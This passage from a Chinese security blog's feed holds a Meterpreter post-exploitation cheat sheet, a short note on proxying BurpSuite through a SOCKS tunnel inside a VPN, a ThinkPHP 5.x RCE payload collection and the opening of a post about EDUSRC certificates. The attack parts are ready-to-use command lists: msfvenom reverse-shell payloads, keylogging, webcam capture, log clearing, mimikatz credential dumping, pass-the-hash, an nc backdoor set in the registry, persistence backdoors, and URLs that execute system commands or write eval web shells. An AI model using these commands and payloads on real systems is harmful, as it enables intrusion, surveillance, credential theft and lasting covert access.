java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f war &gt; 保存路径/文件名.war</code></pre><h3 id="1-3-Android"><a href="#1-3-Android" class="headerlink" title="1 | 3     Android"></a>1 | 3     Android</h3><pre><code>Android：msfvenom -p android/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -o 保存路径/文件名.apk</code></pre><h2 id="2-0-0x01-msfvenom命令参数："><a href="#2-0-0x01-msfvenom命令参数：" class="headerlink" title="2 | 0     0x01 msfvenom命令参数："></a>2 | 0     0x01 msfvenom命令参数：</h2><pre><code> 1 Options: 2     -p, --payload    &lt;payload&gt;  指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;#039;-&amp;#039;或者stdin指定 3     -l, --list  [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all 4     -n, --nopsled    &lt;length&gt;   为payload预先指定一个NOP滑动长度 5     -f, --format     &lt;format&gt;   指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表) 6     -e, --encoder    [encoder]  指定需要使用的encoder（编码器） 7     -a, --arch  &lt;architecture&gt;  指定payload的目标架构 8    --platform   &lt;platform&gt; 指定payload的目标平台 9     -s, --space &lt;length&gt;   设定有效攻击荷载的最大长度10     -b, --bad-chars  &lt;list&gt;     设定规避字符集，比如: &amp;#039;x00xff&amp;#039;11     -i, --iterations &lt;count&gt;    指定payload的编码次数12     -c, --add-code   &lt;path&gt;     指定一个附加的win32 shellcode文件13     -x, --template   &lt;path&gt;     指定一个自定义的可执行文件作为模板14     -k, --keep        保护模板程序的动作，注入的payload作为一个新的进程运行15    --payload-options  列举payload的标准选项16     -o, --out   &lt;path&gt;     保存payload17     -v, --var-name &lt;name&gt;  指定一个自定义的变量，以确定输出格式18    --shellest    最小化生成payload19     -h, --help        查看帮助选项20    --help-formats     查看msf支持的输出格式列表</code></pre><h2 id="3-0-0x02-常用系统命令"><a href="#3-0-0x02-常用系统命令" class="headerlink" title="3 | 0     0x02 常用系统命令"></a>3 | 0     0x02 常用系统命令</h2><pre><code>sessions    #sessions –h 查看帮助sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话background  #将当前会话放置后台run  #执行已有的模块，输入run后按两下tab，列出已有的脚本info #查看已有模块信息getuid # 查看权限 getpid # 获取当前进程的pidsysinfo # 查看目标机系统信息ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程idletime #查看目标机闲置时间reboot / shutdown   #重启/关机shell #进入目标机cmd shell</code></pre><h3 id="3-1-uictl开关键盘-鼠标"><a href="#3-1-uictl开关键盘-鼠标" class="headerlink" title="3 | 1     uictl开关键盘/鼠标"></a>3 | 1     uictl开关键盘/鼠标</h3><pre><code>uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标uictl disable mouse  #禁用鼠标uictl disable keyboard  #禁用键盘</code></pre><h3 id="3-2-webcam摄像头命令"><a href="#3-2-webcam摄像头命令" class="headerlink" title="3 | 2     webcam摄像头命令"></a>3 | 2     webcam摄像头命令</h3><pre><code>webcam_list  #查看摄像头webcam_snap   #通过摄像头拍照webcam_stream   #通过摄像头开启视频</code></pre><h3 id="3-3-execute执行文件"><a href="#3-3-execute执行文件" class="headerlink" title="3 | 3     execute执行文件"></a>3 | 3     execute执行文件</h3><pre><code>execute #在目标机中执行文件execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</code></pre><h3 id="3-4-migrate进程迁移"><a href="#3-4-migrate进程迁移" class="headerlink" title="3 | 4     migrate进程迁移"></a>3 | 4     migrate进程迁移</h3><pre><code>getpid    # 获取当前进程的pidps   # 查看当前活跃进程migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt;   #杀死进程</code></pre><h3 id="3-5-clearev清除日志"><a href="#3-5-clearev清除日志" class="headerlink" title="3 | 5     clearev清除日志"></a>3 | 5     clearev清除日志</h3><pre><code>clearev  #清除windows中的应用程序日志、系统日志、安全日志</code></pre><h2 id="4-0-0x03-文件类命令"><a href="#4-0-0x03-文件类命令" class="headerlink" title="4 | 0     0x03 文件类命令"></a>4 | 0     0x03 文件类命令</h2><h3 id="4-1-基本文件系统命令"><a href="#4-1-基本文件系统命令" class="headerlink" title="4 | 1     基本文件系统命令"></a>4 | 1     基本文件系统命令</h3><pre><code>getwd 或者pwd # 查看当前工作目录  lscdsearch -f   pass    # 搜索文件  -h查看帮助cat c:lltestlltestpasswd.txt  # 查看文件内容upload /tmp/hack.txt C:lltest  # 上传文件到目标机上download c:lltestlltestpasswd.txt /tmp/ # 下载文件到本机上edit c:1.txt #编辑或创建文件  没有的话，会新建文件rm C:lltesthack.txtmkdir lltest2  #只能在当前目录下创建文件夹rmdir lltest2  #只能删除当前目录下文件夹getlwd   或者 lpwd   #操作攻击者主机 查看当前目录lcd /tmp   #操作攻击者主机 切换目录</code></pre><h3 id="4-2-timestomp伪造时间戳"><a href="#4-2-timestomp伪造时间戳" class="headerlink" title="4 | 2     timestomp伪造时间戳"></a>4 | 2     timestomp伪造时间戳</h3><pre><code>timestomp C:// -h   #查看帮助timestomp -v C://2.txt   #查看时间戳timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</code></pre><h2 id="5-0-0x04-网络类命令"><a href="#5-0-0x04-网络类命令" class="headerlink" title="5 | 0     0x04 网络类命令"></a>5 | 0     0x04 网络类命令</h2><h3 id="5-1-基本网络命令"><a href="#5-1-基本网络命令" class="headerlink" title="5 | 1     基本网络命令"></a>5 | 1     基本网络命令</h3><pre><code>ipconfig/ifconfignetstat –anoarpgetproxy   #查看代理信息route   #查看路由</code></pre><h3 id="5-2-portfwd端口转发"><a href="#5-2-portfwd端口转发" class="headerlink" title="5 | 2     portfwd端口转发"></a>5 | 2     portfwd端口转发</h3><pre><code>portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</code></pre><h3 id="5-3-autoroute添加路由"><a href="#5-3-autoroute添加路由" class="headerlink" title="5 | 3     autoroute添加路由"></a>5 | 3     autoroute添加路由</h3><pre><code>run autoroute –h #查看帮助run autoroute -s 192.168.159.0/24  #添加到目标环境网络run autoroute –p  #查看添加的路由</code></pre><h3 id="5-4-利用arp-scanner、portscan等进行扫描"><a href="#5-4-利用arp-scanner、portscan等进行扫描" class="headerlink" title="5 | 4     利用arp_scanner、portscan等进行扫描"></a>5 | 4     利用arp_scanner、portscan等进行扫描</h3><pre><code>run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24  #扫描192.168.1.0/24这个网段run auxiliary/scanner/portscan/tcp RHOSTS=192.168.1.144 PORTS=3389 #检测192.168.1.144是否开启3389端口</code></pre><h3 id="5-5-Socks4a代理"><a href="#5-5-Socks4a代理" class="headerlink" title="5 | 5     Socks4a代理"></a>5 | 5     Socks4a代理</h3><pre><code>autoroute添加完路由后，还可以利用msf自带的sock4a模块进行Socks4a代理msf&gt; use auxiliary/server/socks4a msf &gt; set srvhost 127.0.0.1msf &gt; set srvport 1080msf &gt; run然后vi /etc/proxychains.conf #添加 socks4 127.0.0.1 1080最后proxychains 使用Socks4a代理访</code></pre><h2 id="6-0-0x05-信息收集"><a href="#6-0-0x05-信息收集" class="headerlink" title="6 | 0     0x05 信息收集"></a>6 | 0     0x05 信息收集</h2><h3 id="6-1-信息收集的脚本位于："><a href="#6-1-信息收集的脚本位于：" class="headerlink" title="6 | 1     信息收集的脚本位于："></a>6 | 1     信息收集的脚本位于：</h3><pre><code>/usr/share/metasploit-framework/modules/post/windows/gather/usr/share/metasploit-framework/modules/post/linux/gather</code></pre><h3 id="6-2-信息收集的脚本较多，仅列几个常用的："><a href="#6-2-信息收集的脚本较多，仅列几个常用的：" class="headerlink" title="6 | 2     信息收集的脚本较多，仅列几个常用的："></a>6 | 2     信息收集的脚本较多，仅列几个常用的：</h3><pre><code>run post/windows/gather/checkvm #是否虚拟机run post/linux/gather/checkvm #是否虚拟机run post/windows/gather/forensics/enum_drives #查看分区run post/windows/gather/enum_applications #获取安装软件信息run post/windows/gather/dumplinks   #获取最近的文件操作run post/windows/gather/enum_ie  #获取IE缓存run post/windows/gather/enum_chrome   #获取Chrome缓存run post/windows/gather/enum_patches  #补丁信息run post/windows/gather/enum_domain  #查找域控</code></pre><h2 id="7-0-0x06-提权"><a href="#7-0-0x06-提权" class="headerlink" title="7 | 0     0x06 提权"></a>7 | 0     0x06 提权</h2><h3 id="7-1-getsystem提权"><a href="#7-1-getsystem提权" class="headerlink" title="7 | 1     getsystem提权"></a>7 | 1     getsystem提权</h3><pre><code>getsystem</code></pre><p>getsystem工作原理：<br>getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>Windows服务已启动，导致与命名管道建立连接。<br>该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p><h3 id="7-2-bypassuac"><a href="#7-2-bypassuac" class="headerlink" title="7 | 2     bypassuac"></a>7 | 2     bypassuac</h3><p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：</p><pre><code>use exploit/windows/local/bypassuacuse exploit/windows/local/bypassuac_injectionuse windows/local/bypassuac_vbsuse windows/local/ask</code></pre><h3 id="如使用bypassuac-rb脚本："><a href="#如使用bypassuac-rb脚本：" class="headerlink" title="如使用bypassuac.rb脚本："></a>如使用bypassuac.rb脚本：</h3><pre><code>msf &gt; use exploit/windows/local/bypassuacmsf &gt; set SESSION 2msf &gt; run</code></pre><h3 id="7-3-内核漏洞提权"><a href="#7-3-内核漏洞提权" class="headerlink" title="7 | 3     内核漏洞提权"></a>7 | 3     内核漏洞提权</h3><p>可先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权</p><pre><code>meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息msf &gt; use exploit/windows/local/ms13_053_schlampereimsf &gt; set SESSION 2msf &gt; exploit</code></pre><h2 id="8-0-0x07-mimikatz抓取密码"><a href="#8-0-0x07-mimikatz抓取密码" class="headerlink" title="8 | 0     0x07 mimikatz抓取密码"></a>8 | 0     0x07 mimikatz抓取密码</h2><pre><code>load mimikatz    #help mimikatz 查看帮助wdigest  #获取Wdigest密码mimikatz_command -f samdump::hashes  #执行mimikatz原始命令mimikatz_command -f sekurlsa::searchPasswords</code></pre><h2 id="9-0-0x08-远程桌面-amp-截屏"><a href="#9-0-0x08-远程桌面-amp-截屏" class="headerlink" title="9 | 0     0x08 远程桌面&amp;截屏"></a>9 | 0     0x08 远程桌面&amp;截屏</h2><pre><code>enumdesktops  #查看可用的桌面getdesktop    #获取当前meterpreter 关联的桌面set_desktop   #设置meterpreter关联的桌面  -h查看帮助screenshot  #截屏use espia  #或者使用espia模块截屏  然后输入screengrabrun vnc  #使用vnc远程桌面连接</code></pre><h2 id="10-0-0x09-开启rdp-amp-添加用户"><a href="#10-0-0x09-开启rdp-amp-添加用户" class="headerlink" title="10 | 0     0x09 开启rdp&amp;添加用户"></a>10 | 0     0x09 开启rdp&amp;添加用户</h2><h3 id="10-1-getgui命令"><a href="#10-1-getgui命令" class="headerlink" title="10 | 1     getgui命令"></a>10 | 1     getgui命令</h3><pre><code>run getgui –h #查看帮助run getgui -e #开启远程桌面run getgui -u lltest2 -p 123456   #添加用户run getgui -f 6661 –e   #3389端口转发到6661getgui 系统不推荐，推荐使用run post/windows/manage/enable_rdpgetgui添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆</code></pre><h3 id="10-2-enable-rdp脚本"><a href="#10-2-enable-rdp脚本" class="headerlink" title="10 | 2     enable_rdp脚本"></a>10 | 2     enable_rdp脚本</h3><pre><code>run post/windows/manage/enable_rdp  #开启远程桌面run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</code></pre><p>脚本位于/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb<br>通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</p><h2 id="11-0-0x10-键盘记录"><a href="#11-0-0x10-键盘记录" class="headerlink" title="11 | 0     0x10 键盘记录"></a>11 | 0     0x10 键盘记录</h2><pre><code>keyscan_start  #开始键盘记录keyscan_dump   #导出记录数据keyscan_stop #结束键盘记录</code></pre><h2 id="12-0-0x11-sniffer抓包"><a href="#12-0-0x11-sniffer抓包" class="headerlink" title="12 | 0     0x11 sniffer抓包"></a>12 | 0     0x11 sniffer抓包</h2><pre><code>use sniffersniffer_interfaces   #查看网卡sniffer_start 2   #选择网卡 开始抓包sniffer_stats 2   #查看状态sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包sniffer_stop 2   #停止抓包</code></pre><h2 id="13-0-0x12-注册表操作"><a href="#13-0-0x12-注册表操作" class="headerlink" title="13 | 0     0x12 注册表操作"></a>13 | 0     0x12 注册表操作</h2><pre><code>reg –h    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据</code></pre><h3 id="13-1-注册表设置nc后门"><a href="#13-1-注册表设置nc后门" class="headerlink" title="13 | 1     注册表设置nc后门"></a>13 | 1     注册表设置nc后门</h3><pre><code>upload /usr/share/windows-binaries/nc.exe C:windowssystem32 #上传ncreg enumkey -k HKLMsoftwaremicrosoftwindowscurrentversionrun   #枚举run下的keyreg setval -k HKLMsoftwaremicrosoftwindowscurrentversionrun -v lltest_nc -d 'C:windowssystem32nc.exe -Ldp 443 -e cmd.exe' #设置键值reg queryval -k HKLMsoftwaremicrosoftwindowscurrentversionRun -v lltest_nc   #查看键值nc -v 192.168.159.144 443  #攻击者连接nc后门</code></pre><h2 id="14-0-0x13-令牌操纵"><a href="#14-0-0x13-令牌操纵" class="headerlink" title="14 | 0     0x13 令牌操纵"></a>14 | 0     0x13 令牌操纵</h2><h3 id="14-1-incognito假冒令牌"><a href="#14-1-incognito假冒令牌" class="headerlink" title="14 | 1     incognito假冒令牌"></a>14 | 1     incognito假冒令牌</h3><pre><code>use incognito #help incognito  查看帮助list_tokens -u    #查看可用的tokenimpersonate_token 'NT AUTHORITYSYSTEM'  #假冒SYSTEM token或者impersonate_token NT AUTHORITYSYSTEM #不加单引号 需使用execute -f cmd.exe -i –t    # -t 使用假冒的token 执行或者直接shellrev2self   #返回原始token</code></pre><h3 id="14-2-steal-token窃取令牌"><a href="#14-2-steal-token窃取令牌" class="headerlink" title="14 | 2     steal_token窃取令牌"></a>14 | 2     steal_token窃取令牌</h3><pre><code>steal_token &lt;pid值&gt;   #从指定进程中窃取token   先psdrop_token  #删除窃取的token</code></pre><h2 id="15-0-0x14-哈希利用"><a href="#15-0-0x14-哈希利用" class="headerlink" title="15 | 0     0x14 哈希利用"></a>15 | 0     0x14 哈希利用</h2><h3 id="15-1-获取哈希"><a href="#15-1-获取哈希" class="headerlink" title="15 | 1     获取哈希"></a>15 | 1     获取哈希</h3><pre><code>run post/windows/gather/smart_hashdump  #从SAM导出密码哈希#需要SYSTEM权限</code></pre><h3 id="15-2-PSExec哈希传递"><a href="#15-2-PSExec哈希传递" class="headerlink" title="15 | 2     PSExec哈希传递"></a>15 | 2     PSExec哈希传递</h3><p>通过smart_hashdump获取用户哈希后，可以利用psexec模块进行哈希传递攻击<br>前提条件：①开启445端口 smb服务；②开启admin$共享</p><pre><code>msf &gt; use exploit/windows/smb/psexecmsf &gt; set payload windows/meterpreter/reverse_tcpmsf &gt; set LHOST 192.168.159.134msf &gt; set LPORT 443msf &gt; set RHOST 192.168.159.144msf &gt;set SMBUser Administratormsf &gt;set SMBPass aad3b4          04ee:5b5f00          c424cmsf &gt;set SMBDomain  WORKGROUP   #域用户需要设置SMBDomainmsf &gt;exploit</code></pre><h2 id="16-0-0x15-添加后门维权"><a href="#16-0-0x15-添加后门维权" class="headerlink" title="16 | 0     0x15 添加后门维权"></a>16 | 0     0x15 添加后门维权</h2><h3 id="16-1-metasploit自带的后门有两种方式启动的，一种是通过启动项启动-persistence-，一种是通过服务启动-metsvc-，另外还可以通过persistence-exe自定义后门文件。"><a href="#16-1-metasploit自带的后门有两种方式启动的，一种是通过启动项启动-persistence-，一种是通过服务启动-metsvc-，另外还可以通过persistence-exe自定义后门文件。" class="headerlink" title="16 | 1     metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。"></a>16 | 1     metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。</h3><p>persistence启动项后门</p><p>在C:Users AppDataLocalTemp目录下，上传一个vbs脚本<br>在注册表HKLMSoftwareMicrosoftWindowsCurrentVersionRun加入开机启动项</p><pre><code>run persistence –h  #查看帮助run persistence -X -i 5 -p 6661 -r 192.168.159.134#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</code></pre><p>​    连接后门    </p><pre><code>msf &gt; use exploit/multi/handlermsf &gt; set payload windows/meterpreter/reverse_tcpmsf &gt; set LHOST 192.168.159.134msf &gt; set LPORT 6661msf &gt; exploit</code></pre><h3 id="16-2-metsvc服务后门"><a href="#16-2-metsvc服务后门" class="headerlink" title="16 | 2     metsvc服务后门"></a>16 | 2     metsvc服务后门</h3><p>在C:Users AppDataLocalTemp上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter</p><pre><code>run metsvc –h   # 查看帮助run metsvc –A   #自动安装后门</code></pre><p>​    连接后门    </p><pre><code>msf &gt; use exploit/multi/handlermsf &gt; set payload windows/metsvc_bind_tcpmsf &gt; set RHOST 192.168.159.144msf &gt; set LPORT 31337msf &gt; exploit</code></pre><p> 转载于</p><p><span class="essaySuffix-right-title">作　　者</span>：<strong><span style="font-size: 12px;"><a href="https://www.cnblogs.com/MyGuazi" target="_blank">信安小屋</a></span></strong> <br><span style="font-weight: bold; white-space:nowrap;">出　　处</span>：<a href="https://www.cnblogs.com/MyGuazi" target="_blank">https://www.cnblogs.com/MyGuazi/p/11871420.html</a><br></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决在深信服 VPN 内无法通过 BurpSuite 进行抓包测试</title>
      <link href="/posts/19d2a2m8.html"/>
      <url>/posts/19d2a2m8.html</url>
      
        <content type="html"><![CDATA[<p>这个情况第一次遇见，感谢同事相助。</p><p>起因</p><p>在一次项目中渗透测试，发现拨了入 vpn 之后无法通过 BurpSuite 进行渗透测试，关闭 BurpSuite 单独用浏览器就可以正常访问<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://www.ch1ng.com/blog/usr/uploads/2020/08/3055695777.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/XingHe0/img/post/3693102778.png" alt=""></p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>通过和同事进行交流，其原因可能是深信服 vpn 拦截了 BurpSuite 的发包，用一层中转即可。这里用 ew 开个 sock5 服务器进行本地转发即可。</p><pre><code>ew.exe -s ssocksd -l 9999   //回车有数据出现才行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/XingHe0/img/post/3360298036.png" alt=""></p><p>bp启用socks代理</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/XingHe0/img/post/3013044625.png" alt=""></p><p>成功进行抓包测试<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/XingHe0/img/post/3472325786.png" alt=""></p><p>转载于：<a href="https://www.ch1ng.com/blog/223.html" target="_blank" rel="noopener">https://www.ch1ng.com/blog/223.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VPN </tag>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp5.0和5.1 rce poc总结</title>
      <link href="/posts/19d2a2o8.html"/>
      <url>/posts/19d2a2o8.html</url>
      
        <content type="html"><![CDATA[<p>照搬Sp4ce大神的： <a href="https://bbs.ichunqiu.com/thread-49591-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-49591-1-1.html</a></p><pre><code>版本名     是否可被攻击     攻击条件5.0.0     否             无5.0.1     否             无5.0.2     否             无5.0.3     否             无5.0.4     否             无5.0.5     否             无5.0.6     否             无5.0.7     否             无5.0.8     是             无需开启debug5.0.9     是             无需开启debug5.0.10     是             无需开启debug5.0.11     是             无需开启debug5.0.12     是             无需开启debug5.0.13     是             需开启debug5.0.14     是             需开启debug5.0.15     是             需开启debug5.0.16     是             需开启debug5.0.17     是             需开启debug5.0.18     是             需开启debug5.0.19     是             需开启debug5.0.20     否             无5.0.21     是             需开启debug5.0.22     是             需开启debug5.0.23     是             需开启debug</code></pre><p>两个通杀payload</p><pre><code>版本号：5.0.8~5.0.19payload:s=whoami&amp;_method=__construct&amp;filter&amp;filter=system版本号：5.0.20~5.0.23payload：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUSET_METHOD]=whoami</code></pre><p>不过我测试的不成功</p><p>下面是网上找的payload</p><p>5.1.x php版本&gt;5.5:</p><pre><code>http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=asserthttp://127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=&lt;?php%20phpinfo();?&gt;</code></pre><p>5.0.x php版本&gt;=5.4:</p><pre><code>exp0 = '/index.php/?s=index/\\think\\template\driver\\file/write&amp;cacheFile=zxc0.php&amp;content=&lt;?php @eval($_POST[xxxxxx]);?&gt;'exp1 = '/index.php/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=zxc1.php&amp;vars[1][]=&lt;?php @eval($_POST[xxxxxx]);?&gt;'exp2 = '/index.php/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo \'&lt;?php @eval($_POST[xxxxxx]);?&gt;\'&gt;zxc2.php'</code></pre><p>payload</p><pre><code>http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=操作系统命令http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3Ehttp://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre><p>5.1.x php版本&gt;5.5</p><pre><code>http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=asserthttp://127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=&lt;?php%20phpinfo();?&gt;</code></pre><p>5.0.x php版本&gt;=5.4</p><pre><code>http://127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</code></pre><p>总结5.0.x的payload，成功复现</p><p>使用版本：5.0.7~5.0.23</p><p>poc:</p><pre><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</code></pre><p>exp:</p><p>执行命令：</p><pre><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令 (如 dir whoami)</code></pre><p>写shell：</p><pre><code>?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo \'&lt;?php @eval($_POST[xxxxxx]);?&gt;\'&gt;zxc2.php'?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=zxc1.php&amp;vars[1][]=&lt;?php @eval($_POST[xxxxxx]);?&gt;</code></pre><p>当然还有file_get_contens fopen等php函数也可以写</p><p>总结5.1.x的payload，成功复现</p><p>poc:</p><pre><code>http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=&lt;?php%20phpinfo();?&gt;http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre><p>exp:</p><pre><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令?s=index/\think\Request/input&amp;filter=system&amp;data=操作系统命令?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</code></pre><p>————————————————<br>版权声明：本文为CSDN博主「莫者」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_40709439/article/details/86564457" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40709439/article/details/86564457</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> thinkphp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EDUSRC证书</title>
      <link href="/posts/19a2a2e8.html"/>
      <url>/posts/19a2a2e8.html</url>
      
        <content type="html"><![CDATA[<h2 id="2月份的成果（目前到手，未到还有2）"><a href="#2月份的成果（目前到手，未到还有2）" class="headerlink" title="2月份的成果（目前到手，未到还有2）"></a>2月份的成果（目前到手，未到还有2）</h2><p>目前在忙别的事情，博客暂不更新。。。。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210410195307646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210410195322877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 